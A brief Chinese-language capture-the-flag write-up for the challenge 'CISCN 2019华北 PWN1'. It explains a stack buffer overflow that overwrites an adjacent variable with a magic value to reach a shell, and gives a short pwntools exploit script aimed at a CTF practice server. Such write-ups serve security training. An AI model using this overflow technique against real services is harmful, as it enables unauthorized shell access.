[CISCN 2019华北]PWN1

拿到shell的条件是让v2等于特定的值，恰好有个v1无限制读取，两个数的寄存器首地址相同，那就覆盖到v2的地址，然后把特定值的十六进制数填入

exp

from pwn import *

context(log_level='debug',os='linux',terminal=['tmux','splitw','-h'])

p = remote('node4.anna.nssctf.cn',28409)

payload = b'a'*(0x30-0x4)+p64(0x41348000)

p.sendline(payload)
p.interactive()
